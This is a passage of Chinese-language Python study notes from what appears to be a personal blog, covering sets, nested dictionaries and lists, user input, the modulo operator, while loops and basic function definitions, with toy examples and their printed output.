<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#favorite_languages.py</span></span><br><span class="line">favorite_languages = &#123;</span><br><span class="line">    <span class="string">&#x27;jen&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sarah&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;edward&#x27;</span>: <span class="string">&#x27;ruby&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;phil&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The following languages have been mentioned:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> language <span class="keyword">in</span> <span class="built_in">set</span>(favorite_languages.values()):</span><br><span class="line">    <span class="comment">#为剔除重复项，可使用集合（set）。集合类似于列表，但每个元素都必须是独一无二的：</span></span><br><span class="line">    <span class="built_in">print</span>(language.title())</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">The following languages have been mentioned:</span><br><span class="line">Python</span><br><span class="line">C</span><br><span class="line">Ruby</span><br></pre></td></tr></table></figure></div>

<h2 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h2><blockquote>
<p>可以在列表中嵌套字典、在字典中嵌套列表，可以在字典中嵌套字典。</p>
</blockquote>
<h3 id="字典列表"><a href="#字典列表" class="headerlink" title="字典列表"></a>字典列表</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#alien.py</span></span><br><span class="line">alien_0 = &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: <span class="number">5</span>&#125;</span><br><span class="line">alien_1 = &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;yellow&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: <span class="number">10</span>&#125;</span><br><span class="line">alien_2 = &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: <span class="number">15</span>&#125;</span><br><span class="line">aliens = [alien_0, alien_1, alien_2]</span><br><span class="line"><span class="keyword">for</span> alien <span class="keyword">in</span> aliens:</span><br><span class="line">	<span class="built_in">print</span>(alien)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;color&#x27;: &#x27;green&#x27;, &#x27;points&#x27;: 5&#125;</span><br><span class="line">&#123;&#x27;color&#x27;: &#x27;yellow&#x27;, &#x27;points&#x27;: 10&#125;</span><br><span class="line">&#123;&#x27;color&#x27;: &#x27;red&#x27;, &#x27;points&#x27;: 15&#125;</span><br></pre></td></tr></table></figure></div>

<p>将前三个外星人修改为黄色的、速度为中等且值10个点</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#alien.py</span></span><br><span class="line"><span class="comment"># 创建一个用于存储外星人的空列表</span></span><br><span class="line">aliens = []</span><br><span class="line"><span class="comment"># 创建30个绿色的外星人</span></span><br><span class="line"><span class="keyword">for</span> alien_number <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line"> new_alien = &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;speed&#x27;</span>: <span class="string">&#x27;slow&#x27;</span>&#125;</span><br><span class="line"> aliens.append(new_alien)</span><br><span class="line"><span class="comment">#将前三个外星人修改为黄色的、速度为中等且值10个点</span></span><br><span class="line"><span class="keyword">for</span> alien <span class="keyword">in</span> aliens[<span class="number">0</span>:<span class="number">3</span>]:</span><br><span class="line">    <span class="keyword">if</span> alien[<span class="string">&#x27;color&#x27;</span>] == <span class="string">&#x27;green&#x27;</span>:</span><br><span class="line">        alien[<span class="string">&#x27;color&#x27;</span>] = <span class="string">&#x27;yellow&#x27;</span></span><br><span class="line">        alien[<span class="string">&#x27;speed&#x27;</span>] = <span class="string">&#x27;medium&#x27;</span></span><br><span class="line">        alien[<span class="string">&#x27;points&#x27;</span>] = <span class="number">10</span></span><br><span class="line"><span class="comment"># 显示前五个外星人</span></span><br><span class="line"><span class="keyword">for</span> alien <span class="keyword">in</span> aliens[:<span class="number">5</span>]:</span><br><span class="line">    <span class="built_in">print</span>(alien)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;...&quot;</span>)</span><br><span class="line"><span class="comment"># 显示创建了多少个外星人</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Total number of aliens: &quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(aliens)))</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;speed&#x27;</span>: <span class="string">&#x27;medium&#x27;</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;yellow&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: 10&#125;</span><br><span class="line">&#123;<span class="string">&#x27;speed&#x27;</span>: <span class="string">&#x27;medium&#x27;</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;yellow&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: 10&#125;</span><br><span class="line">&#123;<span class="string">&#x27;speed&#x27;</span>: <span class="string">&#x27;medium&#x27;</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;yellow&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: 10&#125;</span><br><span class="line">&#123;<span class="string">&#x27;speed&#x27;</span>: <span class="string">&#x27;slow&#x27;</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: 5&#125;</span><br><span class="line">&#123;<span class="string">&#x27;speed&#x27;</span>: <span class="string">&#x27;slow&#x27;</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: 5&#125;</span><br><span class="line">...</span><br><span class="line">Total number of aliens: 30</span><br></pre></td></tr></table></figure></div>

<h3 id="字典中存储列表"><a href="#字典中存储列表" class="headerlink" title="字典中存储列表"></a>字典中存储列表</h3><blockquote>
<p>在字典中将一个键关联到多个值时，可以在字典中嵌套一个列表.</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Pizza.py</span></span><br><span class="line"><span class="comment"># 存储所点比萨的信息</span></span><br><span class="line"> pizza = &#123;</span><br><span class="line"><span class="string">&#x27;crust&#x27;</span>: <span class="string">&#x27;thick&#x27;</span>,<span class="comment">#薄厚程度</span></span><br><span class="line"><span class="string">&#x27;toppings&#x27;</span>: [<span class="string">&#x27;mushrooms&#x27;</span>, <span class="string">&#x27;extra cheese&#x27;</span>],<span class="comment">#顾客要求添加的所有配料</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 概述所点的比萨</span></span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;You ordered a &quot;</span> + pizza[<span class="string">&#x27;crust&#x27;</span>] + <span class="string">&quot;-crust pizza &quot;</span> +</span><br><span class="line"><span class="string">&quot;with the following toppings:&quot;</span>)</span><br><span class="line"> <span class="keyword">for</span> topping <span class="keyword">in</span> pizza[<span class="string">&#x27;toppings&#x27;</span>]:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\t&quot;</span> + topping)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">You ordered a thick-crust pizza with the following toppings:</span><br><span class="line">    mushrooms</span><br><span class="line">    extra cheese</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#favorite_languages.py</span></span><br><span class="line">favorite_languages = &#123;</span><br><span class="line">    <span class="string">&#x27;jen&#x27;</span>: [<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;ruby&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;sarah&#x27;</span>: [<span class="string">&#x27;c&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;edward&#x27;</span>: [<span class="string">&#x27;ruby&#x27;</span>, <span class="string">&#x27;go&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;phil&#x27;</span>: [<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;haskell&#x27;</span>],</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> name, languages <span class="keyword">in</span> favorite_languages.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + name.title() + <span class="string">&quot;&#x27;s favorite languages are:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> language <span class="keyword">in</span> languages:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;\t&quot;</span> + language.title())</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Jen<span class="string">&#x27;s favorite languages are:</span></span><br><span class="line"><span class="string">    Python</span></span><br><span class="line"><span class="string">    Ruby</span></span><br><span class="line"><span class="string">Sarah&#x27;</span>s favorite languages are:</span><br><span class="line">    C</span><br><span class="line">Phil<span class="string">&#x27;s favorite languages are:</span></span><br><span class="line"><span class="string">    Python</span></span><br><span class="line"><span class="string">    Haskell</span></span><br><span class="line"><span class="string">Edward&#x27;</span>s favorite languages are:</span><br><span class="line">    Ruby</span><br><span class="line">    Go</span><br></pre></td></tr></table></figure></div>

<h3 id="字典中存储字典"><a href="#字典中存储字典" class="headerlink" title="字典中存储字典"></a>字典中存储字典</h3><blockquote>
<p>例如，如果有多个网站用户，每个都有独特的用户名，可在字典中将用户名作为键，然后将每位用户的信息存储在一个字典中，并将该字典作为与用户名相关联的值。在下面的程序中，对于每位用户，我们都存储了其三项信息：名、姓和居地；为访问这些信息，我们遍历所有的用户名，并访问与每个用户名相关联的信息字典：</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#many_users.py</span></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&#x27;aeinstein&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;first&#x27;</span>: <span class="string">&#x27;albert&#x27;</span>,<span class="comment">#名字</span></span><br><span class="line">        <span class="string">&#x27;last&#x27;</span>: <span class="string">&#x27;einstein&#x27;</span>,<span class="comment">#姓氏</span></span><br><span class="line">        <span class="string">&#x27;location&#x27;</span>: <span class="string">&#x27;princeton&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;mcurie&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;first&#x27;</span>: <span class="string">&#x27;marie&#x27;</span>,<span class="comment">#名字</span></span><br><span class="line">        <span class="string">&#x27;last&#x27;</span>: <span class="string">&#x27;curie&#x27;</span>,<span class="comment">#姓氏</span></span><br><span class="line">        <span class="string">&#x27;location&#x27;</span>: <span class="string">&#x27;paris&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> username, user_info <span class="keyword">in</span> users.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nUsername: &quot;</span> + username)</span><br><span class="line">    full_name = user_info[<span class="string">&#x27;first&#x27;</span>] + <span class="string">&quot; &quot;</span> + user_info[<span class="string">&#x27;last&#x27;</span>]</span><br><span class="line">    location = user_info[<span class="string">&#x27;location&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\tFull name: &quot;</span> + full_name.title())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\tLocation: &quot;</span> + location.title())</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Username: aeinstein</span><br><span class="line">    Full name: Albert Einstein</span><br><span class="line">    Location: Princeton</span><br><span class="line">Username: mcurie</span><br><span class="line">    Full name: Marie Curie</span><br><span class="line">    Location: Paris</span><br></pre></td></tr></table></figure></div>

<h2 id="用户输入"><a href="#用户输入" class="headerlink" title="用户输入"></a>用户输入</h2><h3 id="文本输入input-函数"><a href="#文本输入input-函数" class="headerlink" title="文本输入input()函数"></a>文本输入input()函数</h3><blockquote>
<p><strong>函数input()让程序暂停运行，等待用户输入一些文本。获取用户输入Python将其存储在一个变量中。<u>input()函数获取的将被视为字符串，即使输入的文本为数字，也将以字符串的形式存储。</u></strong></p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#greeter.py</span></span><br><span class="line">prompt = <span class="string">&quot;If you tell us who you are, we can personalize the messages you see.&quot;</span></span><br><span class="line"><span class="comment">#运算符+=在存储在prompt中的字符串末尾附加一个字符串。</span></span><br><span class="line">prompt += <span class="string">&quot;\nWhat is your first name? &quot;</span></span><br><span class="line">name = <span class="built_in">input</span>(prompt)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nHello, &quot;</span> + name + <span class="string">&quot;!&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">If you tell us <span class="built_in">who</span> you are, we can personalize the messages you see.</span><br><span class="line">What is your first name? Eric</span><br><span class="line"></span><br><span class="line">Hello, Eric!</span><br></pre></td></tr></table></figure></div>

<h3 id="获取数值输入int-函数"><a href="#获取数值输入int-函数" class="headerlink" title="获取数值输入int()函数"></a>获取数值输入int()函数</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; age = input(<span class="string">&quot;How old are you? &quot;</span>)</span><br><span class="line">How old are you? 21</span><br><span class="line">&gt;&gt;&gt; age</span><br><span class="line"><span class="string">&#x27;21&#x27;</span><span class="comment">#返回的是&#x27;21&#x27;——用户输入的数值的字符串表示。</span></span><br><span class="line">&gt;&gt;&gt; age &gt;= 18</span><br><span class="line">Traceback (most recent call last):<span class="comment">#报错提示</span></span><br><span class="line">	File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line 1, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: unorderable types: str() &gt;= int()</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><u>Traceback (most recent call last):#报错提示</u></p>
<p><u><strong>TypeError: unorderable types: str() &gt;&#x3D; int()</strong></u></p>
<p>无法将字符串和整数进行比较：不能将存储在age中的字符串’21’与数值18进行比较</p>
</blockquote>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; age = input(<span class="string">&quot;How old are you? &quot;</span>)</span><br><span class="line">How old are you? 21</span><br><span class="line">&gt;&gt;&gt; age = int(age)<span class="comment">#int()函数将字符串强制转换成数值</span></span><br><span class="line">&gt;&gt;&gt; age &gt;= 18</span><br><span class="line">True</span><br></pre></td></tr></table></figure></div>

<h3 id="求模运算-取余运算"><a href="#求模运算-取余运算" class="headerlink" title="求模运算(%)[取余运算]"></a>求模运算(%)[取余运算]</h3><blockquote>
<p>求模运算符（%）是一个很有用的工具，它将两个数相除并返回<u><strong>余数</strong></u>：</p>
</blockquote>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; 4 % 3</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; 5 % 3</span><br><span class="line">2</span><br><span class="line">&gt;&gt;&gt; 6 % 3</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt; 7 % 3</span><br><span class="line">1</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>如果一个数可被另一个数整除，余数就为0，因此求模运算符将返回0。你可利用这一点来判<br>断一个数是奇数还是偶数：</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#even_or_odd.py</span></span><br><span class="line">number = <span class="built_in">input</span>(<span class="string">&quot;Enter a number, and I&#x27;ll tell you if it&#x27;s even or odd: &quot;</span>)</span><br><span class="line">number = <span class="built_in">int</span>(number)</span><br><span class="line"><span class="keyword">if</span> number % <span class="number">2</span> == <span class="number">0</span>:<span class="comment">#偶数</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nThe number &quot;</span> + <span class="built_in">str</span>(number) + <span class="string">&quot; is even.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:<span class="comment">#奇数</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nThe number &quot;</span> + <span class="built_in">str</span>(number) + <span class="string">&quot; is odd.&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Enter a number, and I<span class="string">&#x27;ll tell you if it&#x27;</span>s even or odd: 42</span><br><span class="line">The number 42 is even.</span><br></pre></td></tr></table></figure></div>

<h2 id="While-循环"><a href="#While-循环" class="headerlink" title="While()循环"></a>While()循环</h2><blockquote>
<p>for循环用于针对集合中的每个元素都一个代码块，而while循环不断地运行，直到指定的条<br>件不满足为止。</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">current_number = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> current_number &lt;= <span class="number">5</span>:</span><br><span class="line">    <span class="built_in">print</span>(current_number,end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    current_number += <span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1,2,3,4,5</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#让用户自己选择是否需要继续</span></span><br><span class="line"><span class="comment">#parrot.py</span></span><br><span class="line">prompt = <span class="string">&quot;\nTell me something, and I will repeat it back to you:&quot;</span></span><br><span class="line">prompt += <span class="string">&quot;\nEnter &#x27;quit&#x27; to end the program. &quot;</span></span><br><span class="line">message = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> message != <span class="string">&#x27;quit&#x27;</span>:</span><br><span class="line">	message = <span class="built_in">input</span>(prompt)</span><br><span class="line">	<span class="built_in">print</span>(message)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Tell me something, and I will repeat it back to you:</span><br><span class="line">Enter <span class="string">&#x27;quit&#x27;</span> to end the program. Hello everyone!</span><br><span class="line">Hello everyone!</span><br><span class="line">Tell me something, and I will repeat it back to you:</span><br><span class="line">Enter <span class="string">&#x27;quit&#x27;</span> to end the program. Hello again.</span><br><span class="line">Hello again.</span><br><span class="line">Tell me something, and I will repeat it back to you:</span><br><span class="line">Enter <span class="string">&#x27;quit&#x27;</span> to end the program. quit</span><br><span class="line">quit</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>使用标志，改变标志控制循环</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#parrot.py</span></span><br><span class="line">prompt = <span class="string">&quot;\nTell me something, and I will repeat it back to you:&quot;</span></span><br><span class="line">prompt += <span class="string">&quot;\nEnter &#x27;quit&#x27; to end the program. &quot;</span></span><br><span class="line">active = <span class="literal">True</span></span><br><span class="line"><span class="keyword">while</span> active:</span><br><span class="line">	message = <span class="built_in">input</span>(prompt)</span><br><span class="line"> 	<span class="keyword">if</span> message == <span class="string">&#x27;quit&#x27;</span>:</span><br><span class="line">		active = <span class="literal">False</span></span><br><span class="line"> 	<span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(message)</span><br></pre></td></tr></table></figure></div>

<h3 id="使用break结束循环"><a href="#使用break结束循环" class="headerlink" title="使用break结束循环"></a>使用break结束循环</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cities.py</span></span><br><span class="line">prompt = <span class="string">&quot;\nPlease enter the name of a city you have visited:&quot;</span></span><br><span class="line">prompt += <span class="string">&quot;\n(Enter &#x27;quit&#x27; when you are finished.) &quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	city = <span class="built_in">input</span>(prompt)</span><br><span class="line">	<span class="keyword">if</span> city == <span class="string">&#x27;quit&#x27;</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;I&#x27;d love to go to &quot;</span> + city.title() + <span class="string">&quot;!&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Please enter the name of a city you have visited:</span><br><span class="line">(Enter <span class="string">&#x27;quit&#x27;</span> when you are finished.) New York</span><br><span class="line">I<span class="string">&#x27;d love to go to New York!</span></span><br><span class="line"><span class="string">Please enter the name of a city you have visited:</span></span><br><span class="line"><span class="string">(Enter &#x27;</span>quit<span class="string">&#x27; when you are finished.) San Francisco</span></span><br><span class="line"><span class="string">I&#x27;</span>d love to go to San Francisco!</span><br><span class="line">Please enter the name of a city you have visited:</span><br><span class="line">(Enter <span class="string">&#x27;quit&#x27;</span> when you are finished.) quit</span><br></pre></td></tr></table></figure></div>

<h3 id="使用continue结束本层循环，继续下一次循环"><a href="#使用continue结束本层循环，继续下一次循环" class="headerlink" title="使用continue结束本层循环，继续下一次循环"></a>使用continue结束本层循环，继续下一次循环</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#counting.py</span></span><br><span class="line">current_number = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> current_number &lt; <span class="number">10</span>:</span><br><span class="line">	current_number += <span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span> current_number % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="built_in">print</span>(current_number,end=<span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">1 3 5 7 9</span><br></pre></td></tr></table></figure></div>

<h3 id="使用while循环操作列表"><a href="#使用while循环操作列表" class="headerlink" title="使用while循环操作列表"></a>使用while循环操作列表</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#confirmed_users.py</span></span><br><span class="line">unconfirmed_user = [<span class="string">&#x27;alice&#x27;</span>, <span class="string">&#x27;brian&#x27;</span>, <span class="string">&#x27;candace&#x27;</span>]</span><br><span class="line">confirmed_users = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> unconfirmed_users:</span><br><span class="line">    current_user = unconfirmed_users.pop()</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Verifying user: &quot;</span> + current_user.title())</span><br><span class="line"> 	confirmed_users.append(current_user)</span><br><span class="line"><span class="comment"># 显示所有已验证的用户</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nThe following users have been confirmed:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> confirmed_user <span class="keyword">in</span> confirmed_users:</span><br><span class="line"><span class="built_in">print</span>(confirmed_user.title())</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Verifying user: Candace</span><br><span class="line">Verifying user: Brian</span><br><span class="line">Verifying user: Alice</span><br><span class="line">The following <span class="built_in">users</span> have been confirmed:</span><br><span class="line">Candace</span><br><span class="line">Brian</span><br><span class="line">Alice</span><br></pre></td></tr></table></figure></div>

<h4 id="remove-删除列表中的特定值"><a href="#remove-删除列表中的特定值" class="headerlink" title="remove()删除列表中的特定值"></a>remove()删除列表中的特定值</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pets</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">pets = [<span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;goldfish&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;rabbit&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(pets)</span><br><span class="line"><span class="keyword">while</span> <span class="string">&#x27;cat&#x27;</span> <span class="keyword">in</span> pets:<span class="comment">#循环检查cat是否在列表中</span></span><br><span class="line">    pets.remove(<span class="string">&#x27;cat&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(pets)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;goldfish&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;rabbit&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;goldfish&#x27;</span>, <span class="string">&#x27;rabbit&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<h3 id="使用while循环操作字典"><a href="#使用while循环操作字典" class="headerlink" title="使用while循环操作字典"></a>使用while循环操作字典</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#mountain_poll.py</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">responses = &#123;&#125;</span><br><span class="line"><span class="comment"># 设置一个标志，指出调查是否继续</span></span><br><span class="line">polling_active = <span class="literal">True</span></span><br><span class="line"><span class="keyword">while</span> polling_active:</span><br><span class="line">	<span class="comment"># 提示输入被调查者的名字和回答</span></span><br><span class="line">	name = <span class="built_in">input</span>(<span class="string">&quot;\nWhat is your name? &quot;</span>)</span><br><span class="line">	response = <span class="built_in">input</span>(<span class="string">&quot;Which mountain would you like to climb someday? &quot;</span>)</span><br><span class="line">	<span class="comment"># 将答卷存储在字典中</span></span><br><span class="line">	responses[name] = response</span><br><span class="line">	<span class="comment"># 看看是否还有人要参与调查</span></span><br><span class="line"> 	repeat = <span class="built_in">input</span>(<span class="string">&quot;Would you like to let another person respond? (yes/ no) &quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> repeat == <span class="string">&#x27;no&#x27;</span>:</span><br><span class="line">	polling_active = <span class="literal">False</span></span><br><span class="line"><span class="comment"># 调查结束，显示结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n--- Poll Results ---&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> name, response <span class="keyword">in</span> responses.items():</span><br><span class="line">	<span class="built_in">print</span>(name + <span class="string">&quot; would like to climb &quot;</span> + response + <span class="string">&quot;.&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">What is your name? Eric</span><br><span class="line">Which mountain would you like to climb someday? Denali</span><br><span class="line">Would you like to <span class="built_in">let</span> another person respond? (<span class="built_in">yes</span>/ no) <span class="built_in">yes</span></span><br><span class="line">What is your name? Lynn</span><br><span class="line">Which mountain would you like to climb someday? Devil<span class="string">&#x27;s Thumb</span></span><br><span class="line"><span class="string">Would you like to let another person respond? (yes/ no) no</span></span><br><span class="line"><span class="string">--- Poll Results ---</span></span><br><span class="line"><span class="string">Lynn would like to climb Devil&#x27;</span>s Thumb.</span><br><span class="line">Eric would like to climb Denali.</span><br></pre></td></tr></table></figure></div>





<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="def语句定义函数"><a href="#def语句定义函数" class="headerlink" title="def语句定义函数"></a>def语句定义函数</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#greeter.py</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greeter_user</span>(<span class="params">username</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello@&quot;</span>+username)</span><br><span class="line"></span><br><span class="line">greeter_user(敬请T期待)</span><br></pre></td></tr></table></figure></div>

